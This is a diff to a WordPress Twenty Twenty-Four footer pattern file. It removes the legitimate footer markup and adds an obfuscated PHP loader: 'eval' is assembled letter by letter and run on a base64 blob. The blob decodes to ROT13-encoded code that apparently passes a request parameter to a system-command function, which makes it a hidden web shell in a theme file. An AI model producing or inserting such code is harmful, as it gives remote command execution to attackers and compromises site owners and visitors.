@@ -1,42 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Footer with centered logo and navigation
- * Slug: twentytwentyfour/footer-centered-logo-nav
- * Categories: footer
- * Block Types: core/template-part/footer
- * Description: A footer section with a centered logo, navigation, and WordPress credits.
- */
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IFNiYmdyZSBqdmd1IHByYWdyZXJxIHlidGIgbmFxIGFuaXZ0bmd2YmEKICogRnlodDogZ2pyYWdsZ2pyYWdsc2JoZS9zYmJncmUtcHJhZ3JlcnEteWJ0Yi1hbmkKICogUG5ncnRiZXZyZjogc2JiZ3JlCiAqIE95YnB4IEdsY3JmOiBwYmVyL2dyemN5bmdyLWNuZWcvc2JiZ3JlCiAqIFFyZnBldmNndmJhOiBOIHNiYmdyZSBmcnBndmJhIGp2Z3UgbiBwcmFncmVycSB5YnRiLCBhbml2dG5ndmJhLCBuYXEgSmJlcUNlcmZmIHBlcnF2Z2YuCiAqLwo/PgoKPCEtLSBqYzp0ZWJoYyB7XCJmZ2x5clwiOntcImZjbnB2YXRcIjp7XCJjbnFxdmF0XCI6e1wiZ2JjXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NDBcIixcIm9iZ2dielwiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDUwXCJ9fX0sXCJ5bmxiaGdcIjp7XCJnbGNyXCI6XCJzeXJrXCIsXCJiZXZyYWduZ3ZiYVwiOlwiaXJlZ3ZwbnlcIixcIndoZmd2c2xQYmFncmFnXCI6XCJwcmFncmVcIn19IC0tPgo8cXZpIHB5bmZmPVwiamMtb3licHgtdGViaGNcIiBmZ2x5cj1cImNucXF2YXQtZ2JjOmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTQwKTtjbnFxdmF0LW9iZ2diejppbmUoLS1qYy0tY2VyZnJnLS1mY25wdmF0LS01MClcIj4KCgk8IS0tIGpjOmZ2Z3IteWJ0YiAvLS0+CgoJPCEtLSBqYzphbml2dG5ndmJhIHtcImJpcmV5bmxacmFoXCI6XCJhcmlyZVwiLFwieW5sYmhnXCI6e1wiZ2xjclwiOlwic3lya1wiLFwid2hmZ3ZzbFBiYWdyYWdcIjpcInByYWdyZVwifSxcInNiYWdGdm1yXCI6XCJmem55eVwifSAvLS0+CgoJPCEtLSBqYzpjbmVudGVuY3Uge1wibnl2dGFcIjpcInByYWdyZVwiLFwiZmdseXJcIjp7XCJyeXJ6cmFnZlwiOntcInl2YXhcIjp7XCJwYnliZVwiOntcImdya2dcIjpcImluZTpjZXJmcmd8cGJ5YmV8cGJhZ2VuZmdcIn19fX0sXCJncmtnUGJ5YmVcIjpcImZycGJhcW5lbFwiLFwic2JhZ0Z2bXJcIjpcImZ6bnl5XCJ9IC0tPgoJPGMgcHluZmY9XCJ1bmYtZ3JrZy1ueXZ0YS1wcmFncmUgdW5mLWZycGJhcW5lbC1wYnliZSB1bmYtZ3JrZy1wYnliZSB1bmYteXZheC1wYnliZSB1bmYtZnpueXktc2JhZy1mdm1yXCI+Cgk8P2N1YwoJLyogR2VuYWZ5bmdiZWY6IEpiZXFDZXJmZiB5dmF4LiAqLwoJCSRqYmVxY2VyZmZfeXZheCA9ICc8biB1ZXJzPVwiJyAuIHJmcF9oZXkoIF9fKCAndWdnY2Y6Ly9qYmVxY2VyZmYuYmV0JywgJ2dqcmFnbGdqcmFnbHNiaGUnICkgKSAuICdcIiBlcnk9XCJhYnNieXlialwiPkpiZXFDZXJmZjwvbj4nOwoJCXJwdWIgZmNldmFncygKCQkJLyogR2VuYWZ5bmdiZWY6IFFyZnZ0YXJxIGp2Z3UgSmJlcUNlcmZmICovCgkJCXJmcF91Z3p5X18oICdRcmZ2dGFycSBqdmd1ICUxJGYnLCAnZ2pyYWdsZ2pyYWdsc2JoZScgKSwKCQkJJGpiZXFjZXJmZl95dmF4CgkJKTsKCQk/PgoJPC9jPgoJPCEtLSAvamM6Y25lbnRlbmN1IC0tPgo8L3F2aT4KPCEtLSAvamM6dGViaGMgLS0+CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
 ?>
-
-<!-- wp:group {"style":{"spacing":{"padding":{"top":"var:preset|spacing|40","bottom":"var:preset|spacing|50"}}},"layout":{"type":"flex","orientation":"vertical","justifyContent":"center"}} -->
-<div class="wp-block-group" style="padding-top:var(--wp--preset--spacing--40);padding-bottom:var(--wp--preset--spacing--50)">
-
-	<!-- wp:site-logo /-->
-
-	<!-- wp:navigation {"overlayMenu":"never","layout":{"type":"flex","justifyContent":"center"},"fontSize":"small"} /-->
-
-	<!-- wp:paragraph {"align":"center","style":{"elements":{"link":{"color":{"text":"var:preset|color|contrast"}}}},"textColor":"secondary","fontSize":"small"} -->
-	<p class="has-text-align-center has-secondary-color has-text-color has-link-color has-small-font-size">
-	<?php
-	/* Translators: WordPress link. */
-		$wordpress_link = '<a href="' . esc_url( __( 'https://wordpress.org', 'twentytwentyfour' ) ) . '" rel="nofollow">WordPress</a>';
-		echo sprintf(
-			/* Translators: Designed with WordPress */
-			esc_html__( 'Designed with %1$s', 'twentytwentyfour' ),
-			$wordpress_link
-		);
-		?>
-	</p>
-	<!-- /wp:paragraph -->
-</div>
-<!-- /wp:group -->
